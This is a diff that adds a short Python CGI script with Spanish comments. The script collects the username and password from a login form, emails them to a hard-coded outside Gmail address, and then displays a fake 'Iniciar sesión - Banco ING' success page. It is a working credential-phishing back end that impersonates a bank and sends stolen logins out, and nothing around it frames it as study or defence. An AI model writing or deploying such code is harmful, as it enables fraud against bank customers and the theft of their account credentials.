@@ -1,0 +1,43 @@
+#!/usr/bin/env python
+import cgi
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Configura los parámetros del correo electrónico
+remitente = 'tudirecciondecorreo@gmail.com'
+destinatario = '92blessed92@gmail.com'
+asunto = 'Datos de inicio de sesión'
+
+# Procesa los datos del formulario
+form = cgi.FieldStorage()
+nombre_usuario = form.getvalue('nombre_usuario')
+contraseña = form.getvalue('contraseña')
+
+# Crea el cuerpo del mensaje con los datos del formulario
+mensaje = "Nombre de usuario: {}\nContraseña: {}".format(nombre_usuario, contraseña)
+
+# Crea el mensaje de correo electrónico
+mensaje_correo = MIMEMultipart()
+mensaje_correo['From'] = remitente
+mensaje_correo['To'] = destinatario
+mensaje_correo['Subject'] = asunto
+mensaje_correo.attach(MIMEText(mensaje, 'plain'))
+
+# Conéctate al servidor SMTP de Gmail y envía el correo electrónico
+servidor_smtp = smtplib.SMTP('smtp.gmail.com', 587)
+servidor_smtp.starttls()
+servidor_smtp.login(remitente, 'tucontraseñadecorreo')
+servidor_smtp.send_message(mensaje_correo)
+servidor_smtp.quit()
+
+# Redirecciona a una página de éxito o a donde desees
+print("Content-type:text/html\r\n\r\n")
+print("<html>")
+print("<head>")
+print("<title>Iniciar sesión - Banco ING</title>")
+print("</head>")
+print("<body>")
+print("<h2>¡Inicio de sesión exitoso!</h2>")
+print("</body>")
+print("</html>")
